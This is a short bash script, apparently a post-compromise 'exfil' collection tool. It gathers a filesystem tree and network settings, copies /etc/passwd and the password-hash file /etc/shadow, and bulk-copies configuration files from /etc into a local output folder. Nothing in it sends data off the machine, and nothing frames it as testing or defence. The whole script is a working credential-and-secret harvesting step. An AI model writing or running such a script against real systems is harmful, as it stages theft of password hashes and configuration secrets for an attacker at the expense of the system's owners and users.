#!/bin/bash

usage() {
    echo "Usage: $(basename $0) OUTDIR"
}

if [[ $# -lt 1 ]]; then
    echo "No output directory specified. Outputting to $PWD/exfil"
fi

OUTDIR=${1:-$PWD/exfil}

mkdir -p "$OUTDIR"
mkdir -p "$OUTDIR/configs"

pushd "$OUTDIR"

echo "Getting dirtree..."
tree / > dirtree &

echo "Getting network information..."
ifconfig > ifconfig

echo "Getting user/group information"
cp /etc/passwd passwd
cp /etc/shadow shadow

echo "Getting .conf files in /etc"
find /etc \( -name '*.conf' -o -name '*.config' -o -name '*.xml' -o -name '*.ini' \) -exec cp {} configs/ \; 2>/dev/null

popd
